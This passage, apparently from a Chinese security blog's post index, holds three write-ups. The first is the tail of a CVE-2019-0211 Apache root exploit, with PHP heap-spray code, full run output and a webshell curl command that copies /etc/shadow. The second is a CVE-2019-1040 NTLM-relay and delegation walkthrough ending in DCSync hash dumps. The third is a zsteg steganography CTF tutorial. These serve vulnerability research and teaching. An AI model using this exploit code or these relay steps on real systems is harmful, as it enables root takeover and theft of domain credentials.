0x' . dechex($spray_size));o(' Covered: 0x' . dechex($spray_size * count($workers_pids)));o(' Apache: 0x' . dechex( $addresses['apache'][1] - $addresses['apache'][0]));$s_properties_address = ptr2str($properties_address);for( $i = $spray_min; $i &lt; $spray_max; $i++){ $this-&gt;abc[$i - $address] = $s_properties_address[$i % 8];} 讲到这里可以再回头看看文章刚开始的图，应该就更容易理解了。 进一步提高成功率前面还讲到，可以修改每个worker的process_score-&gt;bucket结构，这样一来，利用成功率就可以再乘以Apache Worker的数量，因为2.4中计算出的bucket索引能落在了SHM之外，如果有多个worker，如下图所示，就能提高&amp;all_buckets[bucket]落在SHM中的概率： 迭代查找每个process_score结构直到找到每个PID，再将找到的PID$workers_pids中的PID对比，匹配的就说明是正确的结构。 123456789101112131415161718$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);$total_nb_buckets = $spray_nb_buckets * count($workers_pids);$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2); for( $p = $addresses['shm'][0] + 0x20; $p &lt; $addresses['shm'][1] &amp;&amp; count($workers_pids) &gt; 0; $p += 0x24 ) { $l = $p - $address; $current_pid = str2ptr($this-&gt;abc, $l, 4); o('Got PID: ' . $current_pid); # The PID matches one of the workers if(in_array($current_pid, $workers_pids)) { unset($workers_pids[$current_pid]); o(' PID matches'); 将所有workerprocess_score.bucket都进行修改，而非修改其中一个：123456789101112# Update bucket address$s_bucket_index = pack('l', $bucket_index);$this-&gt;abc[$l + 0x20] = $s_bucket_index[0];$this-&gt;abc[$l + 0x21] = $s_bucket_index[1];$this-&gt;abc[$l + 0x22] = $s_bucket_index[2];$this-&gt;abc[$l + 0x23] = $s_bucket_index[3];o(' Changed bucket value to ' . $bucket_index);$min = $spray_min - $size_prefork_child_bucket * $bucket_index;$max = $spray_max - $size_prefork_child_bucket * $bucket_index;o(' Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));# This bucket range is covered, go to the next one$bucket_index += $spray_nb_buckets; 到这里，整个漏洞利用过程就结束了，可以等到6:25AM查看利用是否利用成功，也可以手动执行apachectl graceful验证。 123456789101112131415if(count($workers_pids) &gt; 0){ o( 'Unable to find PIDs ' . implode(', ', $workers_pids) . ' in SHM, exiting.' ); exit();}o('');o('EXPLOIT SUCCESSFUL.');o('Await 6:25AM.');return 0; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182➜ curl http://192.168.116.133/carpediem.php\\?cmd\\=cp+/etc/shadow+/tmp/CARPE (DIEM) ~ CVE-2019-0211PID: 887Fetching addresses zend_object_std_dtor: 0x7fc38f605700 system: 0x7fc3936bc480 libaprX: 0x7fc393c39000-0x0x7fc393c6b000 libaprR: 0x7fc393e6b000-0x0x7fc393e6c000 shm: 0x7fc394456000-0x0x7fc39446a000 apache: 0x7fc39446a000-0x0x7fc39452a000Obtaining apache workers PIDs Found apache worker: 887 Found apache worker: 888 Found apache worker: 889 Found apache worker: 890 Found apache worker: 891Got 5 PIDs.Triggering UAF Creating room and filling empty spaces Allocating $abc and $p Unsetting both variables and setting $protector Creating DateInterval objectUAF successful.Address of $abc: 0x7fc38aaa34e8Looking for all_buckets in memory [&amp;mutex]: 0x7fc3944cab70 [mutex]: 0x7fc3944cacc0 [meth]: 0x7fc393e6bca0 [*]: 0x7fc393c53ce0 [*]: 0x7fc393c541b0 [*]: 0x7fc393c53e90 [*]: 0x7fc393c54210 [*]: 0x7fc393c53bf0 [*]: 0x7fc393c53960 [*]: 0x7fc393c6228call_buckets = 0x7fc3944cab60Computing potential bucket indexes and addresses[bucket_index_middle]: -17858Placing payload at address 0x7fc39445a148Spraying pointer Address: 0x7fc39445a218 From: 0x7fc39445a250 To: 0x7fc39446a000 Size: 0xfdb0 Covered: 0x4f470 Apache: 0xc0000Iterating in SHM to find PIDs...[spray_nb_bucket]: 2706[total_nb_buckets]: 13530[bucket_index]: -24623Got PID: 887 PID matches Changed bucket value to -24623 Ranges: 0x7fc3944ea6b8 - 0x7fc3944fa468Got PID: 888 PID matches Changed bucket value to -21917 Ranges: 0x7fc3944da908 - 0x7fc3944ea6b8Got PID: 889 PID matches Changed bucket value to -19211 Ranges: 0x7fc3944cab58 - 0x7fc3944da908Got PID: 890 PID matches Changed bucket value to -16505 Ranges: 0x7fc3944bada8 - 0x7fc3944cab58Got PID: 891 PID matches Changed bucket value to -13799 Ranges: 0x7fc3944aaff8 - 0x7fc3944bada8EXPLOIT SUCCESSFUL.Await 6:25AM. 参考资料[1] CVE-2019-0211 Apache Root Privilege Escalation[2] exploit[3] PHP7内核剖析","link":"/post/aab8343b.html"},{"title":"结合CVE-2019-1040漏洞的两种Windows域提权利方式","text":"2019年6月，Microsoft发布了一条安全更新。该更新针对CVE-2019-1040漏洞进行修复。此次漏洞，攻击者可以通过中间人攻击，绕过NTLM MIC（消息完整性检查）保护，将身份验证流量中继到目标服务器。通过这种攻击使得攻击者在仅有一个普通域账号的情况下可以远程控制 Windows 域内的任何机器，包括域控服务器。 本文主要介绍了利用该漏洞实现Windows域提权的两种方式。 漏洞复现攻击方式一：利用Exchange测试环境： 角色 系统版本 计算机名 IP地址 域 Attacker Ubuntu Server 18.04 ubuntu 192.168.123.69 DC Windows Server 2012 R2 topsec-dc 192.168.123.150 test.local Exchange Windows Server 2012 R2 topsec 192.168.123.143 test.local 测试过程： 环境搭建 安装配置域控制器 安装配置Exchange Server，参考：Exchange Server 2013 一步步安装图解 在域中新建一个用于测试的账户test 执行ntlmrelayx.py脚本进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议。其中–remove-mic选项用于清除MIC标志，–escalate-user用于提升指定用户权限。 执行printerbug.py脚本，触发SpoolService的bug。 SpoolService的bug导致Exchange服务器回连到ntlmrelayx.py，即将认证信息发送到ntlmrelayx.py。可以在下图中看到认证用户是TEST\\TOPSEC$。 接着ntlmrelayx.py开始执行LDAP攻击，加上-debug选项后可以看到更详细的信息。 首先，通过遍历验证中继帐户所在用户组及权限，发现当前账户可以创建用户、可以修改test.local域的ACL，因为域中的Exchange Windows Permissions用户组被允许修改ACL，如下图所示： 该用户组下的成员正是中继的计算机账户TOPSEC 因此脚本会首选修改ACL来提权，因为这相比创建用户的方式更隐秘一些。具体方式是通过LDAP修改域的安全描述符（Security Descriptor），可以在下面的数据包中看到ACL中每一条具体的访问控制条目（ACE，Access Control Entries）： 完成ACL的修改后，test就可以通过secretsdump.py的DCSync功能dump出所有密码哈希值： 攻击方式二：利用Kerberos委派测试环境： 角色 系统版本 计算机名 IP**地址** 域 Attacker Ubuntu Server 18.04 ubuntu 192.168.123.69 DC Windows Server 2012 R2 topsec-dc 192.168.123.212 test.local SDC Windows Server 2012 R2 topsec 192.168.123.62 test.local 测试过程： 环境搭建 安装配置域控制器，同时开启LDAPS支持，因为该攻击方式需要添加新的计算机账户，必须在LDAPS进行。开启方法参考：Enable LDAP over SSL (LDAPS) for Microsoft Active Directory servers 安装配置辅助域控制器，参考： Windows Server 2012 R2 辅助域控制器搭建 在域中新建一个用于测试的账户topsec，一个域管理员admin 和攻击方式一相同，执行ntlmrelayx.py本，使用–delegate-access选项，将中继计算机帐户（这里即辅助域控制器）的访问权限委托给attacker。 attacker对辅助域控制器(SDC)执行printerbug.py脚本 printerbug.py脚本执行成功后，将触发辅助域控制器(SDC)回连Attacker主机，回连使用的认证用户是辅助域控制器(SDC)本地计算机账户TEST/TOPSEC$。 ntlmrelayx.py通过ldaps将该用户账户中继到域控服务器(DC)，因为这种攻击方式下所冒用的身份TEST/TOPSEC$并不在Exchange Windows Permissions组内，不具有修改ACL权限，但是可以通过此身份在DC上添加一个新计算机账户（下图中EJETBTTB$）, 并修改其约束委派授权，授予它对受害计算机（辅助域控制器）的委派权限。 使用getSP.py脚本，通过-impersonate参数模拟用户admin请求其票证，保存为ccache，admin用户为Domain Admins组的成员，具有对辅助域控制器(SDC)的管理与访问权限。 使用上一步骤中保存的Kerberos服务票证，我们可以在目标主机(SDC)上模拟admin身份，从而执行任何操作，例如使用secretsdump转储哈希值。通过secretsdump dump出所有密码哈希值： 攻击流程和技术细节以上就是利用CVE-2019-1040进行攻击的两种方式，这里做一下总结： 1、 Exchange攻击流程：使用任何AD帐户，通过SMB连接到目标Exchange服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，为攻击者帐户授予DCSync权限。攻击者帐户使用DCSync转储AD中的所有密码哈希值。 2、 Kerberos委派攻击流程：使用任何AD帐户，通过SMB连接到目标服务器，并触发SpoolService错误。目标服务器将通过SMB回连至攻击者主机，使用ntlmrelayx将SMB身份验证中继到LDAP。使用中继的LDAP身份验证，将目标服务器的基于资源的约束委派权限授予攻击者控制下的计算机帐户。攻击者作为受害者服务器上的任何用户进行身份验证。 接下来详细介绍整个攻击流程和细节 Exchange攻击流程细节 下文出现的攻击流量图中，各角色与IP对应关系同上文测试环境： 角色 系统版本 计算机名 IP**地址** 域 Attacker Ubuntu Server 18.04 ubuntu 192.168.123.69 DC Windows Server 2012 R2 topsec-dc 192.168.123.150 test.local Exchange Windows Server 2012 R2 topsec 192.168.123.143 test.local 如果对SMB协议不是很清楚，可以先参考技术点分析-客户端与服务器端的SMB通信一节内容 attacker使用普通AD账户登陆Exchange 在攻击的开始阶段，attacker需要确保拥有一个可使用的AD账号，这是满足触发SpoolService错误的必要条件。 首先attacker利用已拥有的AD账号，连接到远程服务器的打印服务（spoolsv.exe）。 成功的通过该阶段，就可以请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。 触发SpoolService错误 attacker通过Printerbug脚本，触发Exchange服务器SpoolService错误，强制Exchange服务器通过MS-RPRN RPC接口向attacker进行身份验证。具体细节见技术点分析一章中的SpoolService/printer bug Exchange主机向Attacker发送Negotiate Protocol Request 在触发SpoolService错误后，Exchange服务器向Attacker进行身份验证 Exchange服务器向Attacker发送Negotiate Protocol Request，这是客户端向服务器发送第一个SMB请求，可参考技术点分析-客户端与服务器端的SMB通信 在正常的业务场景中，用户想登陆并使用Exchange，往往需要向Exchange服务器发送SMB协商请求流量，以便验证身份并登陆。但由于SpoolService错误，在这里，Exchange向Attacker发送SMB协商请求流量，以便验证身份。这便造成了Attacker可以作为中间人身份中继此身份认证以冒充Exchange欺骗DC的机会。 Attacker将协商请求通过ldap中继到DC服务器 在此步骤以及以下攻击流程中，有需要将SMB身份验证通过LDAP中继至DC的环节。由于NTLM协议的工作方式，无法将SMB流量直接通过LDAP中继，因此需要对流量进行修改，而需改流量，势必需要绕过MIC验证，此处便是本次漏洞的重点，详情见 技术点分析-MIC校验绕过部分 attacker向Exchange发送Negotiate Protocol Response Attacker作为中间人，将Negotiate Protocol Request通过ldap请求中继到ad服务器 Exchange向attacker发送Session Setup Request Attacker向DC中继Session Setup Request Attacker将Exchange发送来的Session Setup Request 中继给DC， DC将包含 CHALLENGE的Response发送给Attacker Attacker 向exchange发送Session Setup Response（CHALLENGE） Attacker 将DC发出的包含challenge的Session Setup Response发送给exchange exchange向Attacker发送包含了身份验证请求的Session Setup 我们可以看到下图中的认证用户为TEST\\TOPSEC$，而不是运行Exchange的SYSTEM账户，这是因为SYSTEM账户具有太高权限，如果用此帐户对网络资源进行身份验证，则会出现安全问题。所以当访问网络资源时，使用本地计算机的网络帐户对网络进行身份验，（形式为domain\\computername$，即TEST\\TOPSEC$） Attacker向 DC中继含有Exchange的身份认证的Session Setup Request Attacker将身份认证请求中继到DC，并使用Exchange的身份认证通过DC认证，DC认证通过Exchange身份，并向Attcker发送认证通过的Response 此时，DC对Attacker的身份验证结束，Attacker成功冒用Exchange身份，整个流程如下图： 由于安装Exchange后，Exchange在Active Directory域中具有高权限，Exchange的本地计算机账户TOPSEC$会被加入用户组Exchange Trusted Subsystem，该用户组又隶属于Exchange Windows Permissions。Exchange Windows Permissions组可以通过WriteDacl方式访问Active Directory中的Domain对象，该对象允许该组的任何成员修改域权限，从而可以修改当前域ACL达到提权目的。 使用提权后的用户或计算机可以执行域控制器通常用于复制的同步操作，这允许攻击者同步Active Directory中用户的所有哈希密码。 Kerberos委派攻击流程 下文出现的攻击流量图中，各角色与IP对应关系同上文测试环境： 角色 系统版本 计算机名 IP**地址** 域 Attacker Ubuntu Server 18.04 ubuntu 192.168.123.69 DC Windows Server 2012 R2 topsec-dc 192.168.123.212 test.local SDC Windows Server 2012 R2 topsec 192.168.123.62 test.local Kerberos委派攻击流程与Exchange攻击利用，在DC对Attacker的身份验证结束之前的阶段是类似的。区别在于后续提权过程，下面介绍下Kerberos委派攻击后续攻击流程。 在attacker冒用SDC身份后，由于SDC计算机身份没有修改访问控制列表(ACL)的权限，无法直接提权。而后续提权利用中的S4U2Self不适用于没有SPN的帐户。在域环境中，任何域用户都可以通过MachineAccountQuota创建新的计算机帐户，并为其设置SPN。Attacker通过此方式新建一个域中的计算机账号。这一过程通过LDAP实现并设置账户与密码 ，如下图 在域中新的计算机账户EJETBTTB(下图中的service A)建立成功后，后续攻击如下图攻击步骤 攻击步骤 攻击者为Service A配置了基于资源的约束委派 由于通过S4U2Self请求到的TGS forwardable标志位为 Non-forwardable,这意味着该TGS服务票据是不可转发的，不可以在接下来的S4U2Proxy中进行转发。但是不可转发的TGS竟然可以用于基于资源的约束委派，S4U2Proxy会接收这张不可转发的TGS。由于我们拥有Service A的计算机账号以及密码，所以在这里可以为Service A到SDC配置了基于资源的约束委派，将默认的约束委派更改为基于资源的约束委派，以便后续攻击。 Service A 调用S4U2Self向认证服务器(SDC)为admin请求访问自身的服务票据. 通过国外安全研究员Elad Shami的研究可知，无论服务账号的UserAccountControl属性是否被设为TrustedToAuthForDelegation， 服务自身都可以调用S4U2Self为任意用户请求访问自己的服务票据，也就是说，这里Service A 可以调用S4U2Self向SDC为admin用户申请可访问自身的服务票据. SDC将为admin用户申请的访问Service A的TGS发送给Service A 4、 Service A通过S4U2Proxy 转发TGS，并为admin申请访问SDC票据 5、SDC将为admin用户申请的访问SDC的TGS发送给Service A 在这里，Service A为Attacker创建并控制，Attacker获得TGS票据，利用该票据以admin身份访问SDC，完成提权 技术点分析在理清利用流程后，接下来详解利用流程中的技术点 客户端与服务器端的SMB通信补充介绍一些关于SMB通信协议相关内容，通过这部分内容，可以加深对的漏洞流程的理解。对SMB通信协议熟悉的读者，可以跳过此部分 SMB2 / Negotiate Protocol Negotiate Protocol是在SMB2的任何新TCP会话上发出的第一个SMB2命令，它用于协商要使用的协议版本。 Negotiate Protocol命令分为Negotiate Protocol Request/ Negotiate Protocol Response两部分： Negotiate Protocol Request： 客户端向服务器发送第一个SMB请求：“Negotiate Protocol Request”。这个请求包含了客户端所支持的各种 SMB Dialect。 Negotiate Protocol Response: 服务器收到该请求后，选择一个它支持的最新版本（比如NTLM 0.12），再通过“Negotiate Protocol Response”回复给客户端。 SMB2 / Session Setup SMB2 / Session Setup命令用于对用户进行身份验证并获取分配的UserID。此命令通常是SMB2 / Negotiate Protocol阶段完成后从客户端发出的第一个命令。 Session Setup分为两部分： Session Setup Request: Negotiate Protocol阶段结束之后，，客户端请求和服务器建立一个session，在客户端发送的Session Setup Request里，包含了身份验证请求。 Session Setup Response: 服务器回复是否通过验证。 SpoolService/printer bug在攻击利用流程中，需要使用到一个名为printerbug.py的工具，此工具触发SpoolService/printer bug，强制Windows主机通过MS-RPRN RPC接口向攻击者进行身份验证。 Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，默认情况下是启用的。协议定义的RpcRemoteFindFirstPrinterChangeNotificationEx()调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。 任何经过身份验证的域成员都可以连接到远程服务器的打印服务（spoolsv.exe），并请求对一个新的打印作业进行更新，令其将该通知发送给指定目标。之后它会将立即测试该连接，即向指定目标进行身份验证（攻击者可以选择通过Kerberos或NTLM进行验证）。另外微软表示这个bug是系统设计特点，无需修复。 在本次漏洞的利用过程中，我们通过printerbug.py脚本触发了上述bug，强制Exchange服务器对攻击者（192.168.123.69）发起身份验证，而Exchange默认是以SYSTEM身份执行的。 下图是printerbug.py执行后的数据包： 第一次身份验证由攻击者向exchange服务器发起，以便可以远程连接到Spoolsv服务，可以看到使用的账号是一个普通的域成员账号test； 接着，printerbug.py脚本中调用RpcRemoteFindFirstPrinterChangeNotificationEx()，请求对一个新的打印作业进行更新，并令其将该通知发送给我们指定的attackerhost（192.168.123.69）。这部分数据就是上图中Encrypted SMB3中的一部分。 第二次身份验证便是使Exchange向attackerhost（192.168.123.69）发起的身份验证，用户为TEST\\TOPSEC$，（不是SYSTEM的原因是：如果本地服务使用SYSTEM帐户访问网络资源，则使用本地计算机的网络帐户domain\\computername$对网络进行身份验证） SMB中继LDAP思路以及难点在攻击利用流程中，需要将SMB身份验证通过LDAP中继至DC，由于NTLM协议的工作方式，无法将SMB流量直接通过LDAP中继，将SMB流量通过LDAP中继难点以及绕过思路如下： 1、 默认情况下，SMB中的NTLM身份验证:NEGOTIATE_SIGN为set状态 2、 将此SMB流量中继到LDAP时，由于此时的Negotiate Sign设置为set，该标志会触发LDAP签名，而此SMB流量为Attacker从Exchange服务器上中继而来，无法通过LDAP的签名校验，从而被LDAP忽略，导致攻击失败 3、 为了防止攻击失败，需要将NEGOTIATE_SIGN设置为Not set 4、 MIC保护不被篡改，如果简单的改包，将NEGOTIATE_SIGN设置Not set，将会导致MIC校验不通过 5、 需要寻找一种可以绕过MIC校验的方式，以便更改包中的值 6、 在绕过MIC校验之后，更改NEGOTIATE_SIGN值为Not set，使得在不触发LDAP签名校验的情况下，将SMB中继LDAP MIC校验NTLM身份验证由3种消息类型组成： NTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE。 NTLM_NEGOTIATE，NTLM_CHALLENGE，NTLM_AUTHENTICATE对应位于SMB协议中的SessionSetup阶段 Clinet与Server交互流程图 为了确保恶意行为者不在传输过程中处理消息，在NTLM_AUTHENTICATE消息中添加了一个额外的MIC（消息完整性代码）字段。 MIC是使用会话密钥应用于所有3个NTLM消息的串联的HMAC_MD5，该会话密钥仅对启动认证的帐户和目标服务器是已知的。 因此，试图篡改其中一条消息的攻击者（例如，修改签名协商）将无法生成相应的MIC，这将导致攻击失败。 MIC校验绕过Microsoft服务器允许无MIC 的NTLM_AUTHENTICATE消息。 如果想要将SMB身份验证中继到LDAP，并完成中继攻击，可以通过如下步骤： 取消MIC校验以确保可以修改数据包中的内容： 从NTLM_AUTHENTICATE消息中删除MIC 从NTLM_AUTHENTICATE消息中删除版本字段（删除MIC字段而不删除版本字段将导致错误）。 LDAP签名绕过在绕过MIC校验之后，可以修改NEGOTIATE_SIGN值以便将SMB流量顺利通过LDAP签名校验 将NEGOTIATE_SIGN设置为not set以绕过LDAP验证 取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN 取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION。 smb中继LDAP流程为了实现SMB中继LDAP流程，这里使用ntlmrelayx.py工具作为中继 Ntlmrelayx中继流程如下： 取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN） 可见，在通过LDAP中继时，已经取消设置NTLM_NEGOTIATE消息中的签名标志（NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN） 从NTLM_AUTHENTICATE消息中删除MIC以及版本字段 在通过LDAP中继时，NTLM_AUTHENTICATE消息中MIC以及版本字段已被删除 取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION 在通过LDAP中继时， NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION已经被设置为’NOT set’ 参考链接[1] Exchange Server 2013 一步步安装图解 [2] Enable LDAP over SSL (LDAPS) for Microsoft Active Directory servers [3] Windows Server 2012 R2 辅助域控制器搭建 [4] 滥用基于资源约束委派来攻击Active Directory [5] Abusing S4U2Self: Another Sneaky Active Directory Persistence [6] 利用CVE-2019-1040 - 结合RCE和Domain Admin的中继漏洞 [7] 滥用Exchange：远离域管理员的一个API调用 [8] The SYSTEM Account [9] Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory","link":"/post/ee2ffad8.html"},{"title":"图片隐写信息快速检测工具——zsteg","text":"CTF的图片隐写题中有一种常见的题型——基于LSB原理的图片隐写，而最常用工具就是Stegsolve，但是过程还是有些缓慢和复杂，终于在一次比赛中发现了一个强大的工具——zsteg，这是一个用于检测PNG和BMP中的隐藏数据隐藏数据的工具，可以快速提取隐藏信息，下面就以曾遇到的两个例子说明。 安装Ubuntu中可以使用apt-get命令行工具来安装Ruby和RubyGems，如下所示： 1sudo apt-get install ruby-full rubygems Kali Linux 中则自带了RubyGems。 然后用以下命令安装zsteg后即可使用： 1$ gem install zsteg 对于目标图片，可以分别输入以下命令尝试： 123$ zsteg 你瞅啥.bmp --bits 1 --channel r --lsb --order xy --limit 2048$ zsteg 你瞅啥.bmp --bits 1 --channel g --lsb --order xy --limit 2048$ zsteg 你瞅啥.bmp --bits 1 --channel b --lsb --order xy --limit 2048 各选项含义如下，还有更多选项可以通过-h选项查看 --bits 1：每次只摘取颜色通道中的第 1 个比特。 --channel r：只摘取红色通道的比特位。 --lsb：按最低有效位优先的顺序进行摘取。 --order xy：按照从左至右、从上至下的顺序对图像素点进行摘取。 --limit 2048：最多摘取输出 2048 字节。 QWB-2019 强⽹先锋-打野当然，上面给出的选项都太过复杂了，而且在这道题中也发现没有有效信息。所以本文重点想介绍的事--all选项，这是一个懒人专属的选项 ，可将所有可能的摘取方法都尝试一遍： 发现没有有效信息，于是使用一个懒人专属的选项 --all，可将所有可能的摘取方法都尝试一遍： 最终在结果中挑选出可能的隐写信息：qwxf{you_say_chick_beautiful?} 网鼎杯-2018 第二场 套娃同样的，2018网鼎杯的一道题也可以用同样的方法做出来：","link":"/post/15753.html"}],"tags":[{"name":"UAF","slug":"UAF","link":"/tags/UAF/"},{"name":"提权","slug":"提权","link":"/tags/提权/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"漏洞","slug":"漏洞","link":"/tags/漏洞/"},{"name":"NTML","slug":"NTML","link":"/tags/NTML/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"Canary","slug":"Canary","link":"/tags/Canary/"},{"name":"StackOverflow","slug":"StackOverflow","link":"/tags/StackOverflow/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Fortigate","slug":"Fortigate","link":"/tags/Fortigate/"},{"name":"防火墙","slug":"防火墙","link":"/tags/防火墙/"},{"name":"网络设备","slug":"网络设备","link":"/tags/网络设备/"},{"name":"ghostscrpt","slug":"ghostscrpt","link":"/tags/ghostscrpt/"},{"name":"Apache","slug":"Apache","link":"/tags/Apache/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"Heap Spray","slug":"Heap-Spray","link":"/tags/Heap-Spray/"},{"name":"Binary","slug":"Binary","link":"/tags/Binary/"},{"name":"MISC","slug":"MISC","link":"/tags/MISC/"},{"name":"Steganalysis","slug":"Steganalysis","link":"/tags/Steganalysis/"}],"categories":[{"name":"漏洞分析","slug":"漏洞分析","link":"/categories/漏洞分析/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"}]}